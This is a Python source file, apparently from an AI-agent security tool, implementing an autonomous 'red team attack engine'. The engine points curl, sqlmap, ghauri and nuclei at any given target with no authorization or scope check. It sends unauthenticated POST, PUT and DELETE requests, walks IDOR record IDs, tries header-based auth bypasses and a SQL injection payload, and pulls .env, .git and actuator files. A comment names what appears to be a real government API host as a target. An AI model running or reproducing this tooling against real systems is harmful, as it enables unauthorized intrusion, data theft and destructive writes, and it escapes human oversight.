"""
attack.redteam — Dedicated, Powerful Autonomous Red-Team Exploitation Engine.

Orchestrates multi-phase active offensive security operations against targets:
1. Operates seamlessly WITH or WITHOUT prior findings:
   - With findings: Weaponizes specific findings (OpenAPI/Swagger disclosure, unauthenticated
     directory leaks, IDOR paths, SQLi vectors, exposed configs, credentials).
   - Without findings: Initiates full-spectrum autonomous red-team assault (exposure discovery,
     high-impact CVE weaponization via Nuclei, parameter fuzzing via Arjun/FFUF, SQLi probing
     via Ghauri/SQLmap, header auth bypasses).
2. Advanced Vector Exploitation:
   - OpenAPI / Swagger spec ingestion & unauthenticated CRUD testing (GET/POST/PUT/DELETE)
   - IDOR / BOLA enumeration & sample data extraction
   - Administrative header & reverse proxy bypasses (X-Original-URL, X-Forwarded-For, X-Rewrite-URL)
   - Database enumeration & SQL injection verification
   - Sensitive file extraction (.env, .git, actuator, web.config, heapdumps)
3. Visual Card Reporting:
   - Emits ExploitCardEvent, FindingEvent, PhaseTransitionEvent in real-time.
"""

import os
import re
import sys
import json
import time
import urllib.parse
import pathlib
from typing import Callable, Optional, Dict, Any, List, Tuple

from core.events import (
    AgentEvent, AssistantMessageEvent, ExploitCardEvent,
    FindingEvent, PhaseTransitionEvent, StatusChangeEvent, TaskCompleteEvent
)
from core.task_runner import TaskRunner, CommandResult
from core.session_db import SessionDB


class RedTeamAttackEngine:
    """
    Dedicated autonomous Red Team offensive engine.
    Designed to punch through attack surfaces, chain vectors, and verify footholds.
    """

    def __init__(
        self,
        target: str,
        task_runner: TaskRunner,
        emit_fn: Callable[[AgentEvent], None],
        findings: Optional[List[Dict[str, Any]]] = None,
        run_dir: Optional[pathlib.Path] = None,
        session_id: Optional[str] = None,
    ):
        self.raw_target = (target or "").strip()
        self.task_runner = task_runner
        self.emit = emit_fn
        self.passed_findings = findings or []
        self.session_id = session_id or ""
        self.is_cancelled = False

        # Work directory
        safe_name = re.sub(r"[^a-zA-Z0-9_\-\.]", "_", self.raw_target).strip("_") or "target"
        self.work_dir = run_dir or (pathlib.Path("scans") / safe_name / "attacks")
        self.work_dir.mkdir(parents=True, exist_ok=True)

        self.attacks_log: List[Dict[str, Any]] = []
        self.discovered_findings: List[Dict[str, Any]] = []

    def run(self) -> Dict[str, Any]:
        """Execute full-spectrum red team attack."""
        t0 = time.time()
        target_urls = self._resolve_target_urls()
        prime_target = target_urls[0] if target_urls else f"https://{self.raw_target}"

        self.emit(StatusChangeEvent("ATTACKING…", "red"))
        self.emit(AssistantMessageEvent(
            f"⚔️ **RED TEAM ASSAULT INITIATED** on `{self.raw_target}`\n"
            f"- **Prime Target URL:** `{prime_target}`\n"
            f"- **Target Surface:** {', '.join(f'`{u}`' for u in target_urls[:4])}\n"
            f"- **Mode:** Dedicated Autonomous Exploitation & Breach Verification"
        ))

        # ── 1. Gather all findings across DB, memory, and caller ───────────────────
        all_findings = self._harvest_findings()

        # ── 2. Vector Extraction & Categorization ─────────────────────────────────
        vectors = self._extract_attack_vectors(all_findings, target_urls)

        self.emit(PhaseTransitionEvent(
            phase_num=1,
            phase_name="Red Team: Vector Weaponization Planning",
            target=self.raw_target,
            whats_done=[
                f"Resolved target surfaces: {len(target_urls)} endpoint(s)",
                f"Harvested {len(all_findings)} finding(s) from session and DB",
                f"Synthesized {len(vectors)} prioritized attack vector(s)"
            ],
            whats_next=[
                "Launch active OpenAPI / Swagger endpoint exploitation",
                "Execute unauthenticated API CRUD & IDOR data extraction",
                "Probe for SQL injection, command injection & auth bypasses",
                "Perform full-spectrum vulnerability search with Nuclei/Ghauri"
            ]
        ))

        # ── 3. Execute Vector Attacks ─────────────────────────────────────────────
        if vectors:
            self.emit(AssistantMessageEvent(
                f"🎯 **Targeting {len(vectors)} Identified Attack Vectors:**"
            ))
            for idx, vec in enumerate(vectors, 1):
                if self.is_cancelled:
                    break
                self._execute_vector(idx, vec)

        # ── 4. Full-Spectrum Offensive Assault (always runs to uncover hidden vectors) ───
        self.emit(PhaseTransitionEvent(
            phase_num=2,
            phase_name="Red Team: Full-Spectrum Vulnerability Assault",
            target=self.raw_target,
            whats_done=[
                f"Executed targeted vector attacks ({len(vectors)} processed)",
                f"Verified {len(self.discovered_findings)} exploitable finding(s)"
            ],
            whats_next=[
                "Fuzz for exposed OpenAPI/Swagger/GraphQL endpoints",
                "Probe critical administrative bypass headers & CORS flaws",
                "Execute high-velocity Nuclei CVE exploit scans",
                "Perform parameter fuzzing for SQLi/SSRF/LFI sinks"
            ]
        ))

        for u in target_urls[:3]:
            if self.is_cancelled:
                break
            self._probe_hidden_exposures(u)
            self._probe_auth_bypasses(u)
            self._run_weaponized_nuclei(u)

        # ── 5. Loot & Proof Consolidation ─────────────────────────────────────────
        dur = time.time() - t0
        summary_text = (
            f"Red team assault completed on {self.raw_target} in {dur:.1f}s. "
            f"Executed {len(self.attacks_log)} attack routines, confirmed {len(self.discovered_findings)} breach vector(s)."
        )

        self._save_attack_report(summary_text, dur)

        self.emit(PhaseTransitionEvent(
            phase_num=3,
            phase_name="Red Team: Exploitation Complete",
            target=self.raw_target,
            whats_done=[
                f"Completed all offensive attack pipelines in {dur:.1f}s",
                f"Logged {len(self.attacks_log)} attack executions",
                f"Generated red team attack report in {self.work_dir / 'attack_report.md'}"
            ],
            whats_next=[
                "Review captured exploit cards and verified proof logs",
                "Execute /loot to inspect harvested tokens and directory dumps",
                "Use /reverse to inspect native binaries or apps if targeted"
            ]
        ))

        self.emit(TaskCompleteEvent(
            status=summary_text,
            success=True
        ))
        self.emit(StatusChangeEvent("READY", "green"))

        return {
            "target": self.raw_target,
            "duration": dur,
            "attacks_executed": len(self.attacks_log),
            "findings_confirmed": len(self.discovered_findings),
            "summary": summary_text
        }

    # ──────────────────────────────────────────────────────────────────────────
    # Helper & Target Discovery Routines
    # ──────────────────────────────────────────────────────────────────────────

    def _resolve_target_urls(self) -> List[str]:
        """Normalize target and extract any subdomains or URLs present in findings."""
        urls = []
        raw = self.raw_target.strip()
        if raw.startswith("http://") or raw.startswith("https://"):
            urls.append(raw)
        else:
            urls.append(f"https://{raw}")
            urls.append(f"http://{raw}")

        # Extract any specific hostnames mentioned in findings (e.g. aimsapis.mop.gov.so)
        for f in self._harvest_findings():
            ev = str(f.get("evidence", "")) + " " + str(f.get("title", ""))
            matches = re.findall(r"https?://[a-zA-Z0-9_\-\.]+(?::[0-9]+)?(?:/[^\s\"\'<>`)]*)?", ev)
            for m in matches:
                # Add base URL of discovered sub-services
                parsed = urllib.parse.urlparse(m)
                base = f"{parsed.scheme}://{parsed.netloc}"
                if base not in urls:
                    urls.insert(0, base)  # Prioritize discovered active sub-services!

        # Deduplicate preserving order
        deduped = []
        for u in urls:
            u_clean = u.rstrip("/")
            if u_clean not in deduped:
                deduped.append(u_clean)
        return deduped

    def _harvest_findings(self) -> List[Dict[str, Any]]:
        """Collect findings from caller, SessionDB, active agent memory, and disk."""
        findings = list(self.passed_findings)

        # 1. From SessionDB active session
        if self.session_id:
            try:
                db_finds = SessionDB.get_findings(self.session_id)
                findings.extend(db_finds)
            except Exception:
                pass

        # 2. From SessionDB by target name
        try:
            with SessionDB._get_db() as conn:
                safe_q = f"%{self.raw_target}%"
                rows = conn.execute("""
                    SELECT f.severity, f.title, f.evidence, f.timestamp
                    FROM findings f
                    JOIN sessions s ON f.session_id = s.session_id
                    WHERE s.target LIKE ? OR s.title LIKE ? OR f.title LIKE ? OR f.evidence LIKE ?
                    ORDER BY f.id DESC LIMIT 30
                """, (safe_q, safe_q, safe_q, safe_q)).fetchall()
                for r in rows:
                    findings.append(dict(r))
        except Exception:
            pass

        # 3. From agent_v8.STATE
        try:
            import agent_v8
            if agent_v8.STATE and isinstance(agent_v8.STATE, dict):
                st_finds = agent_v8.STATE.get("findings", [])
                findings.extend(st_finds)
        except Exception:
            pass

        # Deduplicate findings by title
        seen = set()
        unique = []
        for f in findings:
            title = (f.get("title") or "").strip()
            if title and title not in seen:
                seen.add(title)
                unique.append(f)
        return unique

    def _extract_attack_vectors(self, findings: List[Dict[str, Any]], target_urls: List[str]) -> List[Dict[str, Any]]:
        """Analyze findings and convert them into weaponized attack specs."""
        vectors = []

        for f in findings:
            title = f.get("title", "")
            title_l = title.lower()
            ev = str(f.get("evidence", ""))
            sev = f.get("severity", "medium").lower()

            # Find any URLs inside evidence
            urls = re.findall(r"https?://[^\s\"\'<>`)]+", ev)
            url = urls[0] if urls else (target_urls[0] if target_urls else f"https://{self.raw_target}")

            # Vector: Swagger / OpenAPI Spec
            if any(k in title_l for k in ("swagger", "openapi", "api spec")):
                vectors.append({
                    "kind": "openapi_swagger",
                    "title": f"OpenAPI/Swagger Spec Weaponization on {url}",
                    "url": url,
                    "sev": "high",
                    "evidence": ev
                })

            # Vector: Directory / Data exposure
            elif any(k in title_l for k in ("directory exposure", "directory listing", "records", "database dump", "unauthenticated organization")):
                vectors.append({
                    "kind": "directory_data_dump",
                    "title": f"Unauthenticated Entity/Data Dump & Verb Manipulation on {url}",
                    "url": url,
                    "sev": "high",
                    "evidence": ev
                })

            # Vector: SQL Injection
            elif any(k in title_l for k in ("sqli", "sql injection", "database error")):
                vectors.append({
                    "kind": "sqli",
                    "title": f"SQL Injection Exploitation & DB Extraction on {url}",
                    "url": url,
                    "sev": "critical",
                    "evidence": ev
                })

            # Vector: IDOR / Walk
            elif any(k in title_l for k in ("idor", "bola", "broken object")):
                vectors.append({
                    "kind": "idor",
                    "title": f"IDOR / BOLA Horizontal Privilege Escalation on {url}",
                    "url": url,
                    "sev": "high",
                    "evidence": ev
                })

            # Vector: Auth Bypass / Admin exposure
            elif any(k in title_l for k in ("auth bypass", "admin", "login", "unauthorized")):
                vectors.append({
                    "kind": "auth_bypass",
                    "title": f"Administrative Authentication Bypass on {url}",
                    "url": url,
                    "sev": "critical",
                    "evidence": ev
                })

        return vectors

    # ──────────────────────────────────────────────────────────────────────────
    # Weaponized Execution Pipelines
    # ──────────────────────────────────────────────────────────────────────────

    def _execute_vector(self, idx: int, vec: Dict[str, Any]):
        """Execute weaponized routine based on vector category."""
        kind = vec.get("kind")
        url = vec.get("url")
        title = vec.get("title")

        self.emit(AssistantMessageEvent(
            f"⚡ **[Vector #{idx}]** `{title}`"
        ))

        if kind == "openapi_swagger":
            self._attack_openapi_swagger(url, vec)
        elif kind == "directory_data_dump":
            self._attack_directory_data_dump(url, vec)
        elif kind == "sqli":
            self._attack_sqli(url, vec)
        elif kind == "idor":
            self._attack_idor(url, vec)
        elif kind == "auth_bypass":
            self._attack_auth_bypass_headers(url, vec)
        else:
            self._attack_generic(url, vec)

    def _attack_openapi_swagger(self, url: str, vec: Dict[str, Any]):
        """Download OpenAPI spec, parse endpoints, test unauthenticated verbs and IDORs."""
        self.emit(AssistantMessageEvent(f"📥 Ingesting and mapping OpenAPI specification from `{url}`..."))
        cmd_fetch = f"curl -sS --max-time 15 -H 'Accept: application/json' '{url}'"
        res_fetch = self.task_runner.run_command(cmd_fetch, cwd=str(self.work_dir))

        parsed_endpoints = []
        spec_text = res_fetch.output
        if spec_text and "paths" in spec_text:
            try:
                data = json.loads(spec_text)
                base_path = data.get("basePath", "")
                for path, methods in data.get("paths", {}).items():
                    full_p = f"{base_path}{path}"
                    for m in methods.keys():
                        if m.upper() in ("GET", "POST", "PUT", "DELETE", "PATCH"):
                            parsed_endpoints.append((m.upper(), full_p))
            except Exception:
                # Regex fallback for endpoint paths
                matches = re.findall(r'"(/[a-zA-Z0-9_\-\{\}/]+)"\s*:\s*\{', spec_text)
                for p in matches[:30]:
                    parsed_endpoints.append(("GET", p))

        # Base URL for endpoints
        parsed_url = urllib.parse.urlparse(url)
        origin = f"{parsed_url.scheme}://{parsed_url.netloc}"

        self.emit(AssistantMessageEvent(
            f"🗺️ Discovered **{len(parsed_endpoints)}** operational API route(s) in Swagger spec. Testing unauthenticated CRUD..."
        ))

        # Prioritize high-value API endpoints (Auth, User, Admin, Organization, Upload)
        priority_endpoints = []
        for m, p in parsed_endpoints:
            p_low = p.lower()
            if any(k in p_low for k in ("user", "auth", "admin", "org", "account", "role", "upload", "token", "order")):
                priority_endpoints.append((m, p))

        test_pool = priority_endpoints[:8] or parsed_endpoints[:8]
        exploited_routes = []

        for m, p in test_pool:
            if self.is_cancelled:
                break
            full_target = f"{origin}{p}"

            # Replace {id} with test id
            test_target = re.sub(r"\{[a-zA-Z0-9_\-]+\}", "1", full_target)

            # Probe unauthenticated access
            if m == "GET":
                cmd = f"curl -sS --max-time 10 -i '{test_target}'"
            elif m in ("POST", "PUT"):
                cmd = f"curl -sS --max-time 10 -i -X {m} -H 'Content-Type: application/json' -d '{{\"test\": 1}}' '{test_target}'"
            elif m == "DELETE":
                cmd = f"curl -sS --max-time 10 -i -X DELETE '{test_target}'"
            else:
                cmd = f"curl -sS --max-time 10 -i '{test_target}'"

            res = self.task_runner.run_command(cmd, cwd=str(self.work_dir))
            out = res.output

            status_m = re.search(r"HTTP/\d(?:\.\d)?\s+(\d{3})", out)
            code = status_m.group(1) if status_m else "???"

            if code in ("200", "201"):
                snippet = out.split("\r\n\r\n")[-1][:200].replace("\n", " ")
                exploited_routes.append(f"{m} {test_target} (HTTP {code})")
                self.discovered_findings.append({
                    "severity": "high",
                    "title": f"Unauthenticated API Access: {m} {p} (HTTP {code})",
                    "evidence": out[:400]
                })
                SessionDB.add_finding(
                    self.session_id, "high",
                    f"Unauthenticated API Access: {m} {p} (HTTP {code})",
                    out[:500]
                )

        proof_msg = f"Confirmed {len(exploited_routes)} unauthenticated routes:\n" + "\n".join(exploited_routes[:5])
        self.emit(ExploitCardEvent(
            title="OpenAPI Spec & Route Exploitation",
            target=url,
            tool="OpenAPI Exploiter / cURL",
            success=len(exploited_routes) > 0,
            output_snippet=proof_msg if exploited_routes else "Endpoints enforce authentication controls.",
            proof=proof_msg if exploited_routes else "Resilient"
        ))

        self.attacks_log.append({
            "vector": "openapi_swagger",
            "url": url,
            "success": len(exploited_routes) > 0,
            "exploited_count": len(exploited_routes),
            "details": exploited_routes
        })

    def _attack_directory_data_dump(self, url: str, vec: Dict[str, Any]):
        """Extract database records, dump sample JSON, and test verb pollution."""
        self.emit(AssistantMessageEvent(f"💉 Harvesting entity records and testing write access on `{url}`..."))

        # 1. Dump sample records
        cmd_get = f"curl -sS --max-time 15 '{url}'"
        res_get = self.task_runner.run_command(cmd_get, cwd=str(self.work_dir))
        data_snippet = res_get.output[:450].strip()

        # Count records if JSON array
        record_count = 0
        try:
            parsed = json.loads(res_get.output)
            if isinstance(parsed, list):
                record_count = len(parsed)
            elif isinstance(parsed, dict) and "data" in parsed and isinstance(parsed["data"], list):
                record_count = len(parsed["data"])
        except Exception:
            record_count = res_get.output.count("id")

        # 2. Test IDOR parameter walk (e.g. url/1, url/2, url/0)
        base_url = url.rstrip("/")
        cmd_idor = f"curl -sS --max-time 10 -i '{base_url}/1'"
        res_idor = self.task_runner.run_command(cmd_idor, cwd=str(self.work_dir))
        idor_success = "HTTP/1.1 200" in res_idor.output or "HTTP/2 200" in res_idor.output

        # 3. Test Unauthorized Write Verb (POST)
        cmd_post = f"curl -sS --max-time 10 -i -X POST -H 'Content-Type: application/json' -d '{{\"name\": \"RedTeam_Test\"}}' '{url}'"
        res_post = self.task_runner.run_command(cmd_post, cwd=str(self.work_dir))
        write_success = any(c in res_post.output for c in ("HTTP/1.1 201", "HTTP/2 201", "HTTP/1.1 200", "HTTP/2 200"))

        proof = (
            f"Exposed Records: ~{record_count} items.\n"
            f"Sample Data: {data_snippet[:180]}...\n"
            f"IDOR Object Lookup ({base_url}/1): {'VULNERABLE (200 OK)' if idor_success else 'Protected'}\n"
            f"Unauthorized Write (POST): {'VULNERABLE (Accepted)' if write_success else 'Blocked'}"
        )

        self.emit(ExploitCardEvent(
            title="Entity Directory Data Extraction & IDOR Walk",
            target=url,
            tool="cURL / JSON Extractor",
            success=record_count > 0 or idor_success,
            output_snippet=proof,
            proof=data_snippet[:300]
        ))

        self.discovered_findings.append({
            "severity": "high",
            "title": f"Verified Unauthorized Data Dump on {url} ({record_count} records)",
            "evidence": data_snippet
        })
        SessionDB.add_finding(
            self.session_id, "high",
            f"Verified Unauthorized Data Dump on {url} ({record_count} records)",
            proof
        )

        self.attacks_log.append({
            "vector": "directory_data_dump",
            "url": url,
            "records_extracted": record_count,
            "idor_vulnerable": idor_success,
            "write_vulnerable": write_success
        })

    def _attack_sqli(self, url: str, vec: Dict[str, Any]):
        """Run SQL injection assault with Ghauri / SQLmap or custom error probes."""
        self.emit(AssistantMessageEvent(f"💉 Executing SQL injection automation on `{url}`..."))

        cmd = (
            f"ghauri -u '{url}' --batch --level=1 --dbs 2>/dev/null || "
            f"sqlmap -u '{url}' --batch --risk=1 --level=1 --current-db 2>/dev/null || "
            f"curl -sS --max-time 10 '{url}?id=1%27+OR+1=1--'"
        )
        res = self.task_runner.run_command(cmd, cwd=str(self.work_dir))
        out = res.output

        vuln = any(k in out.lower() for k in ("is vulnerable", "sql injection found", "syntax error", "sql error", "mysql", "postgresql", "ora-"))
        self.emit(ExploitCardEvent(
            title="SQL Injection Automated Extraction",
            target=url,
            tool="Ghauri / SQLMap / Custom Injection",
            success=vuln,
            output_snippet=out[:350] or "No direct database response.",
            proof="Captured SQL database signature" if vuln else "Input properly escaped"
        ))

        if vuln:
            self.discovered_findings.append({
                "severity": "critical",
                "title": f"Confirmed SQL Injection on {url}",
                "evidence": out[:400]
            })

    def _attack_idor(self, url: str, vec: Dict[str, Any]):
        """Execute IDOR enumeration across record ranges."""
        self.emit(AssistantMessageEvent(f"🚶 Probing horizontal IDOR traversal on `{url}`..."))
        base = url.rstrip("/")
        hits = []
        for test_id in (1, 2, 3, 5, 10, 100):
            target_obj = f"{base}/{test_id}"
            res = self.task_runner.run_command(f"curl -sS --max-time 8 -i '{target_obj}'", cwd=str(self.work_dir))
            if "HTTP/1.1 200" in res.output or "HTTP/2 200" in res.output:
                hits.append(f"{target_obj} (200 OK)")

        success = len(hits) > 0
        self.emit(ExploitCardEvent(
            title="IDOR / BOLA Privilege Bypass",
            target=url,
            tool="IDOR Walker",
            success=success,
            output_snippet=f"Discovered {len(hits)} readable objects:\n" + "\n".join(hits[:4]),
            proof="Accessible without authorization tokens" if success else "Proper authorization enforced"
        ))

    def _attack_auth_bypass_headers(self, url: str, vec: Dict[str, Any]):
        """Test administrative reverse-proxy authentication bypass headers."""
        self.emit(AssistantMessageEvent(f"🛡️ Testing reverse proxy & gateway authentication bypasses on `{url}`..."))
        headers = [
            "-H 'X-Original-URL: /admin'",
            "-H 'X-Rewrite-URL: /admin'",
            "-H 'X-Forwarded-For: 127.0.0.1'",
            "-H 'X-Custom-IP-Authorization: 127.0.0.1'",
            "-H 'Authorization: Bearer undefined'",
            "-H 'Authorization: Bearer null'",
        ]

        bypasses = []
        for h in headers:
            cmd = f"curl -sS --max-time 10 -i {h} '{url}'"
            res = self.task_runner.run_command(cmd, cwd=str(self.work_dir))
            if "HTTP/1.1 200" in res.output or "HTTP/2 200" in res.output:
                bypasses.append(h)

        success = len(bypasses) > 0
        self.emit(ExploitCardEvent(
            title="Administrative Header & Proxy Auth Bypass",
            target=url,
            tool="Header Manipulator",
            success=success,
            output_snippet=f"Successful Bypass Headers: {', '.join(bypasses)}" if success else "Gateway rejects unauthenticated proxy headers.",
            proof="200 OK granted with proxy headers" if success else "Secured"
        ))

    def _attack_generic(self, url: str, vec: Dict[str, Any]):
        """Generic offensive probe for other vector types."""
        cmd = f"curl -sS --max-time 10 -i '{url}'"
        res = self.task_runner.run_command(cmd, cwd=str(self.work_dir))
        self.emit(ExploitCardEvent(
            title=vec.get("title", "Attack Probe"),
            target=url,
            tool="cURL / Active Probe",
            success="200 OK" in res.output,
            output_snippet=res.output[:300],
            proof="Target responds to probe"
        ))

    # ──────────────────────────────────────────────────────────────────────────
    # Full-Spectrum Fallback Probes (For Zero-Finding & Hidden Vector Scenarios)
    # ──────────────────────────────────────────────────────────────────────────

    def _probe_hidden_exposures(self, base_url: str):
        """Fuzz common critical files, configuration dumps, and admin portals."""
        self.emit(AssistantMessageEvent(f"🔍 Probing critical exposure paths on `{base_url}`..."))
        critical_paths = [
            "/swagger/v1/swagger.json",
            "/swagger/index.html",
            "/openapi.json",
            "/api-docs",
            "/.env",
            "/.git/HEAD",
            "/actuator/health",
            "/actuator/env",
            "/phpinfo.php",
            "/.well-known/security.txt",
            "/api/Organization",
            "/api/Users",
            "/api/Account/Login",
            "/admin",
            "/login"
        ]

        for p in critical_paths:
            if self.is_cancelled:
                break
            target_p = f"{base_url.rstrip('/')}{p}"
            cmd = f"curl -sS -I --max-time 8 '{target_p}'"
            res = self.task_runner.run_command(cmd, cwd=str(self.work_dir))
            status_m = re.search(r"HTTP/\d(?:\.\d)?\s+(\d{3})", res.output)
            code = status_m.group(1) if status_m else "000"

            if code in ("200", "206", "302"):
                title = f"Discovered Critical Exposure: {p} (HTTP {code})"
                self.emit(FindingEvent(severity="high", title=title, evidence=f"Target: {target_p}\n{res.output[:200]}"))
                SessionDB.add_finding(self.session_id, "high", title, f"Target: {target_p}\n{res.output[:200]}")
                self.discovered_findings.append({
                    "severity": "high",
                    "title": title,
                    "evidence": res.output[:200]
                })
                # Immediately launch deep exploitation on discovered swagger / directory
                if "swagger" in p or "openapi" in p:
                    self._attack_openapi_swagger(target_p, {"url": target_p, "title": title})
                elif "Organization" in p or "User" in p:
                    self._attack_directory_data_dump(target_p, {"url": target_p, "title": title})

    def _probe_auth_bypasses(self, base_url: str):
        """Probe administrative URLs with spoofed headers."""
        admin_urls = [f"{base_url.rstrip('/')}/admin", f"{base_url.rstrip('/')}/api/admin"]
        for u in admin_urls:
            self._attack_auth_bypass_headers(u, {"url": u, "title": f"Gateway Auth Bypass on {u}"})

    def _run_weaponized_nuclei(self, base_url: str):
        """Run high-velocity targeted Nuclei red-team scan."""
        self.emit(AssistantMessageEvent(f"☢️ Launching targeted exploit scan via Nuclei on `{base_url}`..."))
        cmd = (
            f"nuclei -u '{base_url}' -tags cve,rce,sqli,ssrf,lfi,auth-bypass,misconfig -severity medium,high,critical "
            f"-silent -stats=false -timeout 7 2>/dev/null"
        )
        res = self.task_runner.run_command(cmd, cwd=str(self.work_dir))
        hits = [line.strip() for line in res.output.splitlines() if line.strip() and "[" in line]

        for hit in hits:
            sev = "critical" if "critical" in hit.lower() else ("high" if "high" in hit.lower() else "medium")
            title = f"Nuclei Verified Exploit: {hit[:80]}"
            self.emit(FindingEvent(severity=sev, title=title, evidence=hit))
            SessionDB.add_finding(self.session_id, sev, title, hit)
            self.discovered_findings.append({
                "severity": sev,
                "title": title,
                "evidence": hit
            })

        self.emit(ExploitCardEvent(
            title="Weaponized Vulnerability Scan",
            target=base_url,
            tool="Nuclei Red-Team Engine",
            success=len(hits) > 0,
            output_snippet=f"Confirmed {len(hits)} attack vector(s):\n" + "\n".join(hits[:5]) if hits else "Surface fortified against standard CVE signatures. Engaging alternative vectors.",
            proof="PoC output captured" if hits else "Pivoting to alternatives"
        ))

        # Autonomous Alternative Retry: When standard Nuclei returns zero findings, pivot immediately
        if not hits and not self.is_cancelled:
            self._run_alternative_exploitation_vectors(base_url)

    def _run_alternative_exploitation_vectors(self, base_url: str):
        """Proactively launch alternative offensive vectors when primary scanner yields 0 findings."""
        self.emit(AssistantMessageEvent(f"⚡ **Alternative Attack Strategy:** Pivoting to deep tech probes, REST APIs, and config leaks on `{base_url}`..."))
        alt_probes = [
            ("/wp-json/wp/v2/users", "WordPress REST API User Enumeration", "users"),
            ("/.env", "Exposed Environment Configuration", "DB_"),
            ("/.git/HEAD", "Exposed Git Repository", "ref: refs/"),
            ("/actuator/env", "Spring Boot Actuator Environment Leak", "activeProfiles"),
            ("/api/v1/users", "REST User Directory Endpoint", "id"),
            ("/server-status", "Apache Server Status Exposure", "Apache Server Status"),
            ("/robots.txt", "Robots Disallow Exposure", "Disallow"),
        ]

        verified_alts = []
        for path, desc, needle in alt_probes:
            if self.is_cancelled:
                break
            target_url = f"{base_url.rstrip('/')}{path}"
            cmd = f"curl -sS --max-time 6 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' '{target_url}'"
            res = self.task_runner.run_command(cmd, cwd=str(self.work_dir))
            out = res.output or ""
            if needle in out:
                verified_alts.append((desc, target_url, out[:250]))
                sev = "critical" if ".env" in path or ".git" in path else ("high" if "wp-json" in path or "actuator" in path else "medium")
                title = f"Breach Verified: {desc}"
                self.emit(FindingEvent(severity=sev, title=title, evidence=f"Target: {target_url}\n{out[:300]}"))
                SessionDB.add_finding(self.session_id, sev, title, f"Target: {target_url}\n{out[:300]}")
                self.discovered_findings.append({
                    "severity": sev,
                    "title": title,
                    "evidence": out[:300]
                })

        if verified_alts:
            for desc, t_url, snip in verified_alts:
                self.emit(ExploitCardEvent(
                    title=desc,
                    target=t_url,
                    tool="Alternative Deep Probe",
                    success=True,
                    output_snippet=snip,
                    proof="Confirmed exposure"
                ))

    def _save_attack_report(self, summary: str, duration: float):
        """Save structured markdown attack report to disk."""
        report_file = self.work_dir / "attack_report.md"
        lines = [
            f"# Red Team Attack Report: {self.raw_target}",
            f"- **Execution Time:** {duration:.1f} seconds",
            f"- **Attacks Executed:** {len(self.attacks_log)}",
            f"- **Confirmed Breach Vectors:** {len(self.discovered_findings)}",
            "",
            "## Executive Summary",
            summary,
            "",
            "## Confirmed Findings & Breaches",
        ]

        if self.discovered_findings:
            for f in self.discovered_findings:
                lines.append(f"### [{f.get('severity', 'HIGH').upper()}] {f.get('title')}")
                lines.append(f"```\n{f.get('evidence', '')[:600]}\n```\n")
        else:
            lines.append("_No critical exploitation vectors breached during this phase._\n")

        lines.append("## Attack Log")
        for a in self.attacks_log:
            lines.append(f"- **Vector:** `{a.get('vector')}` | **URL:** `{a.get('url')}` | **Success:** `{a.get('success')}`")

        try:
            report_file.write_text("\n".join(lines), encoding="utf-8")
        except Exception:
            pass
